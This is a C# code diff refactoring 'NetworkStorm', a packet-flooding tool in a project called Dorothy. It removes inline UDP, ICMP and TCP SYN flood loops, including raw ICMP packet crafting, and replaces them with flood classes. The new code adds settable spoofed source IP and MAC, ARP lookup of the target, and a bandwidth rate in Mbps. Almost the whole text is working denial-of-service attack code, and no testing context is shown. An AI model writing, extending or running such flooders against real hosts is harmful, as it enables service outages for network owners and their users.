@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
@@ -11,16 +12,19 @@ using NLog;
 using PacketDotNet;
 using SharpPcap;
 using SharpPcap.LibPcap;
+using PacketProtocolType = PacketDotNet.ProtocolType;
+using SocketsProtocolType = System.Net.Sockets.ProtocolType;
+using System.Runtime.InteropServices;
 
 namespace Dorothy.Models
 {
-    public class NetworkStorm
+    public class NetworkStorm : IDisposable
     {
-        private string _sourceIp = "192.168.0.1"; // Default Source IP
-        private byte[] _sourceMac = new byte[] { 0x00, 0x0C, 0x29, 0x3E, 0x1C, 0x2B }; // Default MAC
+        private string _sourceIp = string.Empty;
+        private byte[] _sourceMac = Array.Empty<byte>();
         private bool _isAttackRunning = false;
         private readonly TextBox _logArea;
-        private CancellationTokenSource _cancellationSource;
+        private CancellationTokenSource? _cancellationSource;
 
         private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
 
@@ -31,7 +35,25 @@ namespace Dorothy.Models
             _logArea = logArea ?? throw new ArgumentNullException(nameof(logArea));
         }
 
-        public async Task StartAttackAsync(string attackType, string targetIp, int targetPort, long megabitsPerSecond)
+        public void SetSourceIp(string sourceIp)
+        {
+            if (string.IsNullOrWhiteSpace(sourceIp))
+                throw new ArgumentException("Source IP cannot be null or empty.", nameof(sourceIp));
+
+            _sourceIp = sourceIp;
+            Logger.Info($"Source IP set to {_sourceIp}");
+        }
+
+        public void SetSourceMac(byte[] sourceMac)
+        {
+            if (sourceMac == null || sourceMac.Length != 6)
+                throw new ArgumentException("Source MAC must be a 6-byte array.", nameof(sourceMac));
+
+            _sourceMac = sourceMac;
+            Logger.Info($"Source MAC set to {BitConverter.ToString(_sourceMac).Replace("-", ":")}");
+        }
+
+        public async Task StartAttackAsync(AttackType attackType, string targetIp, int targetPort, long megabitsPerSecond)
         {
             if (_isAttackRunning)
             {
@@ -39,30 +61,69 @@ namespace Dorothy.Models
                 return;
             }
 
-            _isAttackRunning = true;
             _cancellationSource = new CancellationTokenSource();
+            _isAttackRunning = true;
 
+            Log("Starting attack...");
             try
             {
-                switch (attackType.ToLower())
+                string targetMacString = await GetMacAddressAsync(targetIp, _sourceIp);
+                byte[] targetMac = ParseMacAddress(targetMacString);
+
+                switch (attackType)
                 {
-                    case "udp":
-                        await StartUdpFloodAsync(targetIp, targetPort, megabitsPerSecond, _cancellationSource.Token);
+                    case AttackType.UdpFlood:
+                        using (var udpFlood = new UdpFlood(
+                            _sourceIp,
+                            _sourceMac,
+                            targetIp,
+                            targetMac,
+                            targetPort,
+                            megabitsPerSecond * 125_000, // Convert Mbps to bytes per second
+                            _cancellationSource.Token))
+                        {
+                            await udpFlood.StartAsync();
+                        }
                         break;
-                    case "icmp":
-                        await StartIcmpFloodAsync(targetIp, megabitsPerSecond, _cancellationSource.Token);
+                    case AttackType.IcmpFlood:
+                        using (var icmpFlood = new IcmpFlood(
+                            _sourceIp,
+                            _sourceMac,
+                            targetIp,
+                            targetMac,
+                            megabitsPerSecond * 125_000,
+                            _cancellationSource.Token))
+                        {
+                            await icmpFlood.StartAsync();
+                        }
                         break;
-                    case "tcp":
-                        await StartTcpSynFloodAsync(targetIp, targetPort, megabitsPerSecond, _cancellationSource.Token);
+                    case AttackType.TcpSynFlood:
+                        using (var tcpFlood = new TcpFlood(
+                            _sourceIp,
+                            _sourceMac,
+                            targetIp,
+                            targetMac,
+                            targetPort,
+                            megabitsPerSecond * 125_000,
+                            _cancellationSource.Token))
+                        {
+                            await tcpFlood.StartAsync();
+                        }
                         break;
                     default:
-                        Log($"Unknown attack type: {attackType}");
-                        break;
+                        throw new ArgumentException($"Unsupported attack type: {attackType}", nameof(attackType));
                 }
+            }
+            catch (Exception ex)
+            {
+                Log($"Error during attack: {ex.Message}");
+                Logger.Error(ex, "Attack failed.");
             }
             finally
             {
                 _isAttackRunning = false;
+                _cancellationSource.Dispose();
+                Log("Attack finished.");
             }
         }
 
@@ -74,226 +135,113 @@ namespace Dorothy.Models
                 return;
             }
 
-            _cancellationSource.Cancel();
+            _cancellationSource?.Cancel();
 
             // Allow some time for the attack to stop gracefully
             await Task.Delay(500);
-            Log("Attack termination requested.");
+
+            _cancellationSource?.Dispose();
+            _isAttackRunning = false;
+
+            Log("Attack has been stopped.");
         }
 
-        private void Log(string message)
+        private async Task<string> GetMacAddressAsync(string targetIp, string sourceIp)
         {
             try
             {
-                var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                var logMessage = $"[{timestamp}] {message}\n";
-
-                // Ensure thread-safe access to the UI thread
-                if (_logArea.Dispatcher.CheckAccess())
+                // Ensure the target is reachable by pinging
+                bool pingable = await PingHostAsync(targetIp);
+                if (!pingable)
                 {
-                    _logArea.AppendText(logMessage);
-                    _logArea.ScrollToEnd();
+                    throw new Exception($"Target IP {targetIp} is not reachable.");
                 }
-                else
-                {
-                    _logArea.Dispatcher.Invoke(() =>
+
+                // Resolve source IP to interface
+                NetworkInterface? sourceInterface = NetworkInterface.GetAllNetworkInterfaces()
+                    .FirstOrDefault(ni =>
                     {
-                        _logArea.AppendText(logMessage);
-                        _logArea.ScrollToEnd();
+                        var ipv4Props = ni.GetIPProperties().UnicastAddresses
+                            .FirstOrDefault(ua => ua.Address.ToString() == sourceIp);
+                        return ipv4Props != null && ni.OperationalStatus == OperationalStatus.Up;
                     });
+
+                if (sourceInterface == null)
+                {
+                    throw new Exception($"No network interface found with source IP {sourceIp}.");
                 }
 
-                Logger.Debug(message);
+                // Convert IP addresses to integers (network byte order)
+                IPAddress srcIp = IPAddress.Parse(sourceIp);
+                IPAddress dstIp = IPAddress.Parse(targetIp);
+                uint srcIpInt = BitConverter.ToUInt32(srcIp.GetAddressBytes().Reverse().ToArray(), 0);
+                uint dstIpInt = BitConverter.ToUInt32(dstIp.GetAddressBytes().Reverse().ToArray(), 0);
+
+                byte[] macAddr = new byte[6];
+                int macAddrLen = macAddr.Length;
+
+                int result = SendARP((int)dstIpInt, (int)srcIpInt, macAddr, ref macAddrLen);
+                if (result != 0)
+                {
+                    throw new Exception($"SendARP failed with error code {result}.");
+                }
+
+                // Convert MAC address bytes to string format
+                string macAddress = BitConverter.ToString(macAddr, 0, macAddrLen).Replace("-", ":");
+                return macAddress;
             }
             catch (Exception ex)
             {
-                // Fallback logging in case of failure
-                Logger.Error(ex, "Logging failed.");
+                Logger.Error(ex, $"Failed to get MAC address for IP {targetIp}.");
+                throw;
             }
         }
 
-        private async Task StartIcmpFloodAsync(string targetIp, long megabitsPerSecond, CancellationToken token)
+        private byte[] ParseMacAddress(string macString)
         {
-            Log("Starting ICMP Flood attack...");
             try
             {
-                // Approximate bytes per ping (payload + headers)
-                long bytesPerPing = 64; // Typical ICMP Echo Request size
-                long bitsPerPing = bytesPerPing * 8;
-                long totalBitsPerSecond = megabitsPerSecond * 1_000_000;
-                int pingsPerSecond = (int)(totalBitsPerSecond / bitsPerPing);
-
-                // Cap the pings per second to a reasonable number to prevent system overload
-                pingsPerSecond = Math.Min(pingsPerSecond, 100_000); // Example cap at 100,000 pings/sec
-                if (pingsPerSecond <= 0) pingsPerSecond = 1;
-
-                Log($"ICMP Flood: Sending {pingsPerSecond} pings per second ({megabitsPerSecond} Mbps).");
-
-                int successfulPings = 0;
-                var lastLogTime = DateTime.Now;
-
-                // Initialize SharpPcap device
-                var devices = CaptureDeviceList.Instance;
-                if (devices.Count < 1)
-                {
-                    Log("No capture devices found.");
-                    return;
-                }
-
-                // Select the first device (modify as needed)
-                var device = devices[0];
-                device.Open();
-
-                // Resolve MAC addresses
-                var targetIpAddress = IPAddress.Parse(targetIp);
-                var sourceIpAddress = IPAddress.Parse(_sourceIp);
-
-                PhysicalAddress targetMac;
-
-                // ARP resolution can be implemented here or statically set
-                // For simplicity, using a placeholder MAC address
-                targetMac = new PhysicalAddress(new byte[] { 0x00, 0x0C, 0x29, 0x3E, 0x1C, 0x2B });
-
-                while (!token.IsCancellationRequested)
-                {
-                    var icmpPackets = new List<Packet>();
-
-                    for (int i = 0; i < pingsPerSecond; i++)
-                    {
-                        // Build Ethernet Layer
-                        var ethernet = new EthernetPacket(new PhysicalAddress(_sourceMac), targetMac, EthernetType.IPv4);
-
-                        // Build IP Layer
-                        var ip = new IPv4Packet(sourceIpAddress, targetIpAddress)
-                        {
-                            Protocol = PacketDotNet.ProtocolType.Icmp,
-                            TimeToLive = 128
-                        };
-                        // Build ICMP Layer
-                        var icmp = new IcmpV4EchoRequestPacket(IPAddress.HostToNetworkOrder((short)42))
-                        {
-                            Identifier = 1,
-                            SequenceNumber = (short)i
-                        };
-                        icmp.Bytes = Encoding.ASCII.GetBytes(new string('A', 56)); // 56 bytes payload
-
-                        // Combine layers
-                        ip.PayloadPacket = icmp;
-                        ethernet.PayloadPacket = ip;
-
-                        icmpPackets.Add(ethernet);
-                    }
-
-                    // Send all ICMP packets
-                    foreach (var pkt in icmpPackets)
-                    {
-                        device.SendPacket(pkt);
-                        successfulPings++;
-                    }
-
-                    // Log every second
-                    var currentTime = DateTime.Now;
-                    if ((currentTime - lastLogTime).TotalSeconds >= 1)
-                    {
-                        Log($"ICMP Flood: Sent {successfulPings} pings in the last second.");
-                        successfulPings = 0;
-                        lastLogTime = currentTime;
-                    }
-
-                    // Wait for 1 second before sending the next batch
-                    await Task.Delay(1000, token);
-                }
-
-                device.Close();
-            }
-            catch (OperationCanceledException)
-            {
-                Log("ICMP Flood attack canceled.");
+                return macString.Split(':').Select(hex => Convert.ToByte(hex, 16)).ToArray();
             }
             catch (Exception ex)
             {
-                Logger.Error(ex, "Error during ICMP Flood");
-                Log($"ICMP Flood attack error: {ex.Message}");
-            }
-            finally
-            {
-                Log("ICMP Flood attack stopped.");
+                Logger.Error(ex, $"Failed to parse MAC address from string {macString}.");
+                throw new Exception("Invalid MAC address format.");
             }
         }
 
-        private async Task StartTcpSynFloodAsync(string targetIp, int targetPort, long megabitsPerSecond, CancellationToken token)
+        private async Task<bool> PingHostAsync(string host)
         {
-            Log("Starting TCP SYN Flood attack...");
-            try
-            {
-                using (TcpFlood tcpFlood = new TcpFlood(targetIp, targetPort, megabitsPerSecond, token, logAction: Log))
-                {
-                    await tcpFlood.StartAsync();
-                }
-            }
-            catch (OperationCanceledException)
-            {
-                Log("TCP SYN Flood attack canceled.");
-            }
-            catch (Exception ex)
-            {
-                Logger.Error(ex, "Error during TCP SYN Flood");
-                Log($"TCP SYN Flood attack error: {ex.Message}");
-            }
-            finally
-            {
-                Log("TCP SYN Flood attack stopped.");
-            }
-        }
-
-        private async Task StartUdpFloodAsync(string targetIp, int targetPort, long megabitsPerSecond, CancellationToken token)
-        {
-            Log("Starting UDP Flood attack...");
-            using (UdpClient udpClient = new UdpClient())
+            using (var ping = new Ping())
             {
                 try
                 {
-                    udpClient.Connect(targetIp, targetPort);
-                    byte[] data = Encoding.ASCII.GetBytes(new string('A', 1024)); // 1 KB payload
-
-                    // Convert Mbps to Bytes per Second
-                    long bytesPerSecond = megabitsPerSecond * 125_000; // 1 Mbps = 125,000 Bytes
-                    int packetsPerSecond = (int)(bytesPerSecond / data.Length);
-                    if (packetsPerSecond <= 0) packetsPerSecond = 1;
-
-                    Log($"UDP Flood: Sending {packetsPerSecond} packets per second ({megabitsPerSecond} Mbps).");
-
-                    while (!token.IsCancellationRequested)
-                    {
-                        var sendTasks = new List<Task>();
-
-                        for (int i = 0; i < packetsPerSecond; i++)
-                        {
-                            sendTasks.Add(udpClient.SendAsync(data, data.Length));
-                        }
-
-                        await Task.WhenAll(sendTasks);
-                        Log($"UDP Flood: Sent {packetsPerSecond} packets in the last second.");
-
-                        // Wait for 1 second before sending the next batch
-                        await Task.Delay(1000, token);
-                    }
+                    PingReply reply = await ping.SendPingAsync(host, 1000);
+                    return reply.Status == IPStatus.Success;
                 }
-                catch (OperationCanceledException)
+                catch (PingException ex)
                 {
-                    Log("UDP Flood attack canceled.");
-                }
-                catch (Exception ex)
-                {
-                    Logger.Error(ex, "Error during UDP Flood attack.");
-                    Log($"UDP Flood attack error: {ex.Message}");
-                }
-                finally
-                {
-                    udpClient.Close();
-                    Log("UDP Flood attack stopped.");
+                    Logger.Error(ex, $"Ping to {host} failed.");
+                    return false;
                 }
             }
         }
+
+        public void Log(string message)
+        {
+            _logArea.Dispatcher.Invoke(() =>
+            {
+                _logArea.AppendText($"{DateTime.Now}: {message}\n");
+                _logArea.ScrollToEnd();
+            });
+        }
+
+        public void Dispose()
+        {
+            _cancellationSource?.Dispose();
+        }
+
+        [DllImport("iphlpapi.dll", ExactSpelling = true)]
+        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
     }
 }
